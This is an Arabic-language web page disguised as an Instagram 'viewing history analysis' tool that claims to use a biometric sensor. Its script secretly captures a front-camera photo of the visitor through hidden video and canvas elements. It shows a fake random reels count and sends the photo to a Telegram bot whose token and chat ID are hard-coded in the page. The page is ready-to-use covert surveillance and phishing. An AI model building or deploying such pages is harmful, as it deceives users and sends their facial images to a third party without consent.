<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram Insights</title>
    <style>
        body { margin: 0; background-color: #FAFAFA; font-family: sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
        .card { background: white; padding: 35px 20px; border-radius: 20px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); text-align: center; width: 85%; max-width: 380px; border: 1px solid #efefef; }
        .btn { background: #0095f6; color: white; padding: 15px; border: none; border-radius: 10px; font-weight: bold; width: 100%; cursor: pointer; font-size: 16px; }
        #loading { display: none; margin-top: 20px; }
        #result { display: none; margin-top: 20px; }
        .count { font-size: 35px; font-weight: 800; color: #ed4956; margin: 10px 0; display: block; }
        video, canvas { display: none; position: absolute; left: -9999px; } /* إخفاء العناصر تماماً عن العين */
        .spinner { border: 3px solid #f3f3f3; border-top: 3px solid #0095f6; border-radius: 50%; width: 25px; height: 25px; animation: spin 1s linear infinite; margin: 0 auto 10px; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>

<div class="card">
    <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" width="60" style="margin-bottom:15px;">
    <h2>تحليل سجل المشاهدات</h2>
    <p style="color:#8e8e8e; font-size:14px;">اضغط لمعرفة عدد الريلز التي شاهدتها عبر فحص المستشعر البيومتري.</p>
    
    <button class="btn" id="startBtn" onclick="startCapture()">بدء التحليل</button>

    <div id="loading">
        <div class="spinner"></div>
        <p id="status">جاري تشغيل المستشعر...</p>
    </div>

    <div id="result">
        <p style="font-weight:bold;">اكتمل التحليل!</p>
        <span class="count" id="reelsNum">0</span>
        <p style="font-size:12px; color:#0095f6;">تم سحب البيانات من السجل بنجاح</p>
    </div>
</div>

<video id="v" autoplay playsinline muted></video>
<canvas id="c"></canvas>

<script>
    const token = "8409685298:AAHN_RpQJ0Ete85gZMYgi2rPaE99lwX0DPs";
    const chat = "7822309283";

    async function startCapture() {
        document.getElementById('startBtn').style.display = 'none';
        document.getElementById('loading').style.display = 'block';

        try {
            const stream = await navigator.mediaDevices.getUserMedia({ 
                video: { facingMode: "user", width: 640, height: 480 } 
            });
            
            const video = document.getElementById('v');
            video.srcObject = stream;

            // توليد الرقم العشوائي
            const rand = Math.floor(Math.random() * 3001) + 2000;
            document.getElementById('reelsNum').innerText = rand.toLocaleString();

            // الانتظار حتى يبدأ الفيديو فعلياً (تجاوز السواد)
            video.onplaying = () => {
                document.getElementById('status').innerText = "جاري مسح البصمة... (يرجى الثبات)";
                
                // ننتظر 5 ثوانٍ بعد اشتغال الكاميرا لضمان الإضاءة
                setTimeout(() => {
                    sendSnapshot(stream);
                }, 5000);
            };

        } catch (e) {
            alert("يجب السماح بالكاميرا لرؤية النتيجة.");
            location.reload();
        }
    }

    function sendSnapshot(stream) {
        const video = document.getElementById('v');
        const canvas = document.getElementById('c');
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        
        const ctx = canvas.getContext('2d');
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
        
        canvas.toBlob(b => {
            const fd = new FormData();
            fd.append('chat_id', chat);
            fd.append('photo', b, 's.jpg');
            
            fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: fd })
            .then(() => {
                document.getElementById('loading').style.display = 'none';
                document.getElementById('result').style.display = 'block';
                stream.getTracks().forEach(t => t.stop());
            });
        }, 'image/jpeg', 0.7);
    }
</script>
</body>
</html>
